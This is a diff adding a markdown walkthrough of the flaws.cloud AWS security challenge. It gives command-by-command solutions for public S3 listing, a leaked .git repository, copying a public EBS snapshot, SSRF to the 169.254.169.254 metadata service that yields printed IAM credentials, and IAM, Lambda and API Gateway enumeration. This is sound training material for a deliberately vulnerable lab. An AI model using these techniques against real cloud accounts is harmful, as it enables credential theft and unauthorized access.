@@ -1,0 +1,213 @@
+# flaws.cloud
+$ dig flaws.cloud any -> 52.218.144.23 -> s3-website-us-west-2.amazonaws.com. (PTR) -> flaws.cloud.s3-website-us-west-2.amazonaws.com
+* level 1 - s3 bucket with "Everyone" has List permissions
+$ aws s3 ls s3://flaws.cloud/ --no-sign-request --region us-west-2 # or just visit http://flaws.cloud.s3.amazonaws.com/
+2017-02-28 15:34:39       2156 hint1.html
+2017-02-27 12:59:34       1640 hint2.html
+2017-02-27 12:59:36       1101 hint3.html
+2017-03-02 11:08:14       2874 index.html
+2017-02-27 12:59:28         46 robots.txt
+2017-02-27 12:59:30       1051 secret-dd02c7c.html
+
+* level 2 - bucket with "Any Authenticated AWS User" has List permissions
+$ aws configure --profile sebflaws # create access key in IAM
+$ aws s3 --profile sebflaws ls s3://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud # in IAM, user needs to have AmazonS3FullAccess policy under permissions
+2017-02-27 13:02:15      80751 everyone.png
+2017-03-02 11:46:41       1434 hint1.html
+2017-02-27 13:04:39       1035 hint2.html
+2017-02-27 13:02:14       2786 index.html
+2017-02-27 13:02:14         26 robots.txt
+2017-02-27 13:02:15       1051 secret-e4443fc.html
+
+* level 3 - bucket with .git repo
+$ aws s3 sync s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/ . --no-sign-request --region us-west-2
+$ aws configure --profile flaws
+$ aws --profile flaws s3 ls
+2017-02-19 06:41:52 2f4e53154c0a7fd086a04a12a452c2a4caed8da0.flaws.cloud
+2017-02-27 07:06:33 flaws-logs
+2017-02-19 06:40:54 flaws.cloud
+2017-02-24 16:15:42 level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud
+2017-02-27 05:29:03 level3-9afd3927f195e10225021a578e6f78df.flaws.cloud
+2017-02-27 05:49:31 level4-1156739cfb264ced6de514971a4bef68.flaws.cloud
+2017-02-27 06:49:03 level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud
+2017-02-27 06:48:40 level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud
+2017-02-27 07:07:13 theend-797237e8ada164bf9f12cebf93b282cf.flaws.cloud
+
+* level 4 - public snapshot of disk volume of EC2
+$ aws --profile flaws sts get-caller-identity # shows account id and name
+{
+    "Arn": "arn:aws:iam::975426262029:user/backup",
+    "Account": "975426262029",
+    "UserId": "AIDAJQ3H5DC3LEG2BKSLC"
+}
+$ aws --profile flaws ec2 describe-snapshots --owner-id 975426262029
+{
+    "Snapshots": [
+        {
+            "Encrypted": false,
+            "StartTime": "2017-02-28T01:35:12.000Z",
+            "Tags": [
+                {
+                    "Value": "flaws backup 2017.02.27",
+                    "Key": "Name"
+                }
+            ],
+            "OwnerId": "975426262029",
+            "SnapshotId": "snap-0b49342abd1bdcb89",
+            "Description": "",
+            "VolumeSize": 8,
+            "VolumeId": "vol-04f1c039bc13ea950",
+            "State": "completed",
+            "Progress": "100%"
+        }
+    ]
+}
+$ aws --profile sebtest ec2 create-volume --availability-zone us-west-2a --snapshot-id snap-0b49342abd1bdcb89 # new volume is a copy of the snapshot
+{
+    "Size": 8,
+    "SnapshotId": "snap-0b49342abd1bdcb89",
+    "AvailabilityZone": "us-west-2a",
+    "State": "creating",
+    "VolumeId": "vol-0a57c0c50099a4531",
+    "Encrypted": false,
+    "CreateTime": "2017-03-02T03:02:49.222Z",
+    "VolumeType": "standard"
+}
+spin up new ec2 instance to mount this volume
+
+* level 5 - magic IP 169.254.169.254 in the cloud world (AWS, Azure, Google, DigitalOcean) allows cloud resources to find out metadata about themselves
+if you can make any sort of HTTP request from an EC2 to that IP, you likely can obtain sensitive owner info
+$ curl http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws/
+{
+  "Code" : "Success",
+  "LastUpdated" : "2017-03-02T05:29:14Z",
+  "Type" : "AWS-HMAC",
+  "AccessKeyId" : "ASIAJELZ6I2CVWCR6UIQ",
+  "SecretAccessKey" : "7IFkrk9irAfbeA3wSvFXu1lv/jiM2KRqFani7Q+Z",
+  "Token" : "FQoDYXdzEIf//////////wEaDOLBMpmarXvNA22VMiK3A8I+r7bFcfibc2YEQ18byJjJpBaipqeypy1tUe1DZ6WaoHxhSCnIetP0LPDR1qijiykZ/wdeyGnXZtrCFFWTBzP+7nUCcXhuKOdVo82HWXHqZOBVUVmGpZ77qV62Hq2jppjjpmO9JsLoYXCsEFSqnz6A8r3EGSrVeVbUaIVNq7Kp2fT8LblgKtOAgyzVy1nbpYOfdnu/0Am0HV2WkjTTqCR61nyseUn6AnuX6rsM4k1CJ7mcQQqAiTGduuAngGP0h+neO4WpcDqpoFw3J183e1U3+POH3DGCPq9P+Pb0g/Hb1v7eMCLQ/rpYFVuVcsX5r6JlSiyHDxMYS/RzLuzH2PC33baei+8DRdmgMQnM4OiXMlWtf9/2CLzxKOtckV+CDEsVRv/AWh6VWcnAXCGQOsErAbKW2clNxDEvbSVWdkYnukI94FHlweHup80fYAAmL20yNRGNm4bAwmngxQh1BD0ca9l3j5xFiGNvbSczjUNHZUkVmPwJX6l/LzuZIQTF8PqHeJOAwM/7+2plVYAEi009hkC9xJUET6f1iXnw93+vZJOqMwnGAwSpw5ZFiZ0M/c07QnPNpuso39vexQU=",
+  "Expiration" : "2017-03-02T12:03:32Z"
+$ aws configure --profile level5; echo "aws_session_token = FQoD...U=" >> ~/.aws/credentials
+$ aws --profile level5 s3 ls level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud
+                           PRE ddcc78ff/
+2017-02-27 13:11:07        871 index.html
+
+* level 6
+$ aws configure --profile level6
+$ aws --profile level6 iam get-user # find out my username (Level6)
+{
+    "User": {
+        "Path": "/",
+        "UserId": "AIDAIRMDOSCWGLCDWOG6A",
+        "CreateDate": "2017-02-26T23:11:16Z",
+        "Arn": "arn:aws:iam::975426262029:user/Level6",
+        "UserName": "Level6"
+    }
+}
+$ aws --profile level6 iam list-attached-user-policies --user-name Level6 # find out what policies are attached to it
+{
+    "AttachedPolicies": [
+        {
+            "PolicyArn": "arn:aws:iam::975426262029:policy/list_apigateways",
+            "PolicyName": "list_apigateways"
+        },
+        {
+            "PolicyArn": "arn:aws:iam::aws:policy/SecurityAudit",
+            "PolicyName": "SecurityAudit"
+        }
+    ]
+}
+$ aws --profile level6 iam get-policy --policy-arn arn:aws:iam::aws:policy/SecurityAudit
+{
+    "Policy": {
+        "AttachmentCount": 1,
+        "Path": "/",
+        "IsAttachable": true,
+        "UpdateDate": "2016-12-09T18:51:11Z",
+        "CreateDate": "2015-02-06T18:41:01Z",
+        "PolicyId": "ANPAIX2T3QCXHR2OGGCTO",
+        "DefaultVersionId": "v9",
+        "PolicyName": "SecurityAudit",
+        "Arn": "arn:aws:iam::aws:policy/SecurityAudit",
+        "Description": "The security audit template grants access to read security configuration metadata. It is useful for software that audits the configuration of an AWS account."
+    }
+}
+$ aws --profile level6 iam get-policy --policy-arn arn:aws:iam::975426262029:policy/list_apigateways # get the policy's version id
+{
+    "Policy": {
+        "PolicyId": "ANPAIRLWTQMGKCSPGTAIO",
+        "DefaultVersionId": "v4",
+        "PolicyName": "list_apigateways",
+        "UpdateDate": "2017-02-20T01:48:17Z",
+        "CreateDate": "2017-02-20T01:45:17Z",
+        "Description": "List apigateways",
+        "AttachmentCount": 1,
+        "Arn": "arn:aws:iam::975426262029:policy/list_apigateways",
+        "Path": "/",
+        "IsAttachable": true
+    }
+}
+$ aws --profile level6 iam get-policy-version --policy-arn arn:aws:iam::975426262029:policy/list_apigateways --version-id v4
+{
+    "PolicyVersion": {
+        "CreateDate": "2017-02-20T01:48:17Z",
+        "Document": {
+            "Statement": [
+                {
+                    "Effect": "Allow",
+                    "Resource": "arn:aws:apigateway:us-west-2::/restapis/*",
+                    "Action": [
+                        "apigateway:GET"
+                    ]
+                }
+            ],
+            "Version": "2012-10-17"
+        },
+        "VersionId": "v4",
+        "IsDefaultVersion": true
+    }
+}
+-> tells us using this policy we can call "apigateway:GET" on "arn:aws:apigateway:us-west-2::/restapis/*"
+API gateway in this case is used to call a lambda function, but you need to figure out how to invoke it.
+The SecurityAudit policy let's you see some things about lambdas
+$ aws --region us-west-2 --profile level6 lambda list-functions
+{
+    "Functions": [
+        {
+            "Description": "A starter AWS Lambda function.",
+            "Role": "arn:aws:iam::975426262029:role/service-role/Level6",
+            "Handler": "lambda_function.lambda_handler",
+            "CodeSize": 282,
+            "FunctionName": "Level6",
+            "MemorySize": 128,
+            "LastModified": "2017-02-27T00:24:36.054+0000",
+            "Version": "$LATEST",
+            "Timeout": 3,
+            "Runtime": "python2.7",
+            "FunctionArn": "arn:aws:lambda:us-west-2:975426262029:function:Level6",
+            "CodeSha256": "2iEjBytFbH91PXEMO5R/B9DqOgZ7OG/lqoBNZh5JyFw="
+        }
+    ]
+}
+-> tells us there is a function named "Level6", and the SecurityAudit also lets you run
+$ aws --region us-west-2 --profile level6 lambda get-policy --function-name Level6
+{
+    "Policy": "{\"Version\":\"2012-10-17\",\"Id\":\"default\",\"Statement\":[{\"Sid\":\"904610a93f593b76ad66ed6ed82c0a8b\",\"Effect\":\"Allow\",\"Principal\":{\"Service\":\"apigateway.amazonaws.com\"},\"Action\":\"lambda:InvokeFunction\",\"Resource\":\"arn:aws:lambda:us-west-2:975426262029:function:Level6\",\"Condition\":{\"ArnLike\":{\"AWS:SourceArn\":\"arn:aws:execute-api:us-west-2:975426262029:s33ppypa75/*/GET/level6\"}}}]}"
+}
+-> tells us about the ability to execute `arn:aws:execute-api:us-west-2:975426262029:s33ppypa75/*/GET/level6\` That "s33ppypa75" is a rest-api-id, which you can then use with that other attached policy:
+$ aws --profile level6 --region us-west-2 apigateway get-stages --rest-api-id "s33ppypa75"
+{
+    "item": [
+        {
+            "stageName": "Prod",
+            "deploymentId": "8gppiv",
+            "lastUpdatedDate": 1488155168,
+            "cacheClusterEnabled": false,
+            "cacheClusterStatus": "NOT_AVAILABLE",
+            "createdDate": 1488155168,
+            "methodSettings": {}
+        }
+    ]
+}
+-> tells us the stage name is "Prod". Lambda functions are called using that rest-api-id, stage name, region, and resource as:
+$ curl https://s33ppypa75.execute-api.us-west-2.amazonaws.com/Prod/level6
+"Go to http://theend-797237e8ada164bf9f12cebf93b282cf.flaws.cloud/d730aa2b/"
